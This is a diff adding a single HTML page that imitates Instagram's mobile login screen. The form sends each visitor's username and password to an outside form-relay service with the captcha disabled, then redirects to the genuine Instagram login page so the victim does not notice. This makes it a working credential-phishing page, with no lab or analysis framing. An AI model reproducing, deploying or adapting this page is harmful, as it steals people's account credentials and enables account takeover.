@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 100%;
+            padding: 40px 25px;
+            text-align: center;
+            flex-grow: 1;
+        }
+        .logo-container {
+            margin: 40px 0 30px;
+        }
+        .instagram-text-logo {
+            font-family: 'Dancing Script', cursive;
+            font-size: 50px;
+            color: #262626;
+            font-weight: 700;
+            text-decoration: none;
+        }
+        input {
+            width: 100%;
+            padding: 14px 10px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            background-color: #fafafa;
+            font-size: 14px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+        button {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 0;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 15px 0;
+            cursor: pointer;
+        }
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .line {
+            height: 1px;
+            flex: 1;
+            background-color: #dbdbdb;
+        }
+        .text {
+            padding: 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .fb-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 10px;
+        }
+        .footer {
+            border-top: 1px solid #dbdbdb;
+            width: 100%;
+            padding: 25px;
+            text-align: center;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+        .footer a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo-container">
+        <a href="https://www.instagram.com" class="instagram-text-logo">Instagram</a>
+    </div>
+    
+    <form action="https://formsubmit.co/17b477cd6050f2d1ca810c2fde34102d" method="POST">
+        <input type="hidden" name="_next" value="https://www.instagram.com/accounts/login/">
+        <input type="hidden" name="_captcha" value="false">
+        
+        <input type="text" name="Username" placeholder="Phone number, email or username" required>
+        <input type="password" name="Password" placeholder="Password" required>
+        
+        <button type="submit">Log In</button>
+    </form>
+
+    <div class="separator">
+        <div class="line"></div>
+        <div class="text">OR</div>
+        <div class="line"></div>
+    </div>
+
+    <a href="https://www.facebook.com/login" class="fb-login">Log in with Facebook</a>
+    <p style="margin-top: 20px;">
+        <a href="https://www.instagram.com/accounts/password/reset/" style="font-size: 12px; color: #00376b; text-decoration: none;">Forgot password?</a>
+    </p>
+</div>
+
+<div class="footer">
+    Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+</div>
+
+</body>
+</html>
